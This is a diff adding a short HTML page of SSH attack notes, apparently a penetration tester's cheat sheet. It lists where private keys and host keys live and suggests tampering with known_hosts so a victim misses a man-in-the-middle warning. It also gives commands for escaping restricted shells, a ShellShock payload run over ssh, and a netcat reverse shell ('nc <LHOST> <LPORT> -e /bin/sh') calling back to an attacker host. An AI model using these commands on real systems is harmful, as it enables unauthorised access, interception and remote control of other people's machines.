@@ -1,0 +1,34 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Notes</title>
+</head><body>SSH notes: <br/>
+root and default dir for ssh (enterprise often different): /home/&lt;user&gt;/.ssh/<br/>
+default host keys: /etc/ssh/ssh_host_&lt;ALGORITHM&gt;_key<br/>
+known_hosts: server fingerprints. advanced MITM, change so user doesn't know MITM warning. <br/>
+id_&lt;ALGORITHM&gt; (ie, id_rsa, id_dsa, etc): ssh private key<br/>
+id_&lt;ALGORITHM&gt;.pub (ie, id_rsa.pub, id_dsa.pub, etc): ssh public key<br/>
+<br/>
+<br/>
+Check /etc/ssh/sshd_config for interesting locations (ie auth_keys location)<br/>
+Check /etc/ssh/ssh_config for other options<br/>
+<br/>
+<br/>
+use SSH on your machine to execute commands before the shell is loaded:<br/>
+ssh user@server -t &quot;/bin/sh&quot;<br/>
+<br/>
+or start the shell without loading &quot;rc&quot; profice (where most limits are configured):<br/>
+ssh user@server -t &quot;bash --noprofile&quot;<br/>
+<br/>
+try ShellShock on vulnerable implementations<br/>
+ssh user@server -t &quot;() { :; }; /bin/bash&quot;<br/>
+<br/>
+try to execute other commands such as nc to get full shell<br/>
+ssh user@server nc &lt;LHOST&gt; &lt;LPORT&gt; -e /bin/sh<br/>
+<br/>
+-T   Disable pseudo-tty allocation.<br/>
+<br/>
+-t   Force pseudo-tty allocation. This can be used to execute arbitrary <br/>
+    screen-based programs on a remote machine, which can be very useful,<br/>
+    e.g. when implementing menu services. Multiple -t options force tty<br/>
+    allocation, even if ssh has no local tty. (-tt)</body></html>
